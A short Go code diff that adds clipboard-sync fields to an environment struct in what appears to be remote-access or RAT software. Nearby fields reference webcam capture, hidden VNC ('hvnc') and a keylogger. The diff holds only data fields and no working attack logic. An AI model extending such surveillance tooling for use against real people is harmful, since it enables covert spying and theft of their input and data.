@@ -40,6 +40,10 @@ type Env struct {
 	WebcamCancel        context.CancelFunc
 	WebcamDone          chan struct{}
 	WebcamMu            sync.Mutex
+	ClipboardSyncCancel context.CancelFunc
+	ClipboardSyncDone   chan struct{}
+	ClipboardSyncMu     sync.Mutex
+	ClipboardSyncSource string // "rd" or "hvnc"
 	// Other fields
 	Plugins                   *plugins.Manager
 	Keylogger                 *keylogger.Keylogger
